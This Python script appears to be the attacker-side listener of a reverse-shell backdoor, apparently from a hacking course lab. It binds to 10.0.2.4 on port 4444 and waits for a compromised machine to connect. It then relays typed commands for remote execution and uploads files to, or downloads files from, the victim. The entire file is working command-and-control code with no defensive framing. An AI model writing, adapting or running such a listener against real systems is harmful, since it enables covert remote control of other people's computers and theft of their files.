#!/usr/bin/env python

import socket
import json
import base64 as b64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #allows socket to be reused in case connection drops
        # listener.bind(("10.0.2.4", 4444))
        listener.bind((ip,port))

        listener.listen(0) #backlog for how many connections to allow before stopping
        print("[+] Waiting for incoming connections. . .\n")
        self.connection, address = listener.accept()
        print("[+] Connection established with " + str(address))

    def send_json(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive_json(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    #upload_file
    def read_file(self, path):
        try:
            with open(path,"rb") as file:
                return b64.b64encode(file.read())
        except Exception as e:
            print(e)
            return "Error"

    #download_file
    def write_file(self, path, content):
        with open(path,'wb') as file:
            file.write(b64.b64decode(content))
            return "[+] Download successful. . ."

    def execute_remotely(self, command):
        # self.send_json(command)

        #exit program
        if(command[0].lower() == "exit"):
            self.send_json(command)
            self.connection.close()
            print("[+] Exiting shell. . .")
            exit()

        #upload file
        elif(command[0].lower() == "upload"):
            command.append( (self.read_file(command[1]) ).decode() )
            # upload = [command[0] ,fileName, upload_file]
            if("Error" in command):
                return "\n"
            else:
                self.send_json(command)

        else:
            self.send_json(command)

        return self.receive_json()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            #clear screen command
            if(command[0] == "cls"):
                print("\n" * 30)
                continue

            result = self.execute_remotely(command)

            #download file
            if(command[0] == "download"):
                result = self.write_file(command[1], result)

            print(result)

ip = "10.0.2.4"
port = 4444
my_Listener = Listener(ip, port)
my_Listener.run()
